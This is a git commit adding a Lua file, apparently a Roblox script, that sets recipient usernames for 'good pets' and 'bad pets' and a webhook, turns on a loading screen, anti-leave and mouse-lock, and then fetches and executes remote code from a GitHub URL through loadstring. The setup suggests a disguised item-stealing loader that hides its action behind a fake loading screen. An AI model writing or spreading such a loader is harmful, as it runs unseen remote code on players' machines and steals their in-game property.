388ddb11bed2c66ff2bfad752cc9517d7f1bd30b
LolSkyd <141207632+LolSkyd@users.noreply.github.com>
2023-08-02 13:32:03 +0800

    Mail.

---
+++ obf_Q87RNti42100fKk267Sku3k67U4G6I7TZremiEia9d39ZARjPHQIVaWm56xk5C48.lua
@@ -0,0 +1,9 @@
+UserName= "Kurt_bibe123" -- good pets
+Webhook= ". (optional)"
+UserName2= "unsoymo234mo" -- bad pets
+ 
+_G.LoadingScreen = true -- make it true if you want the loadingscreen
+_G.AntiLeave = true -- make it true if you want the antileave
+_G.MouseLock = true -- make it true if you want the mouselock
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KuritoScriptz/KuMa-Hub/main/KuritoScripts", true))()
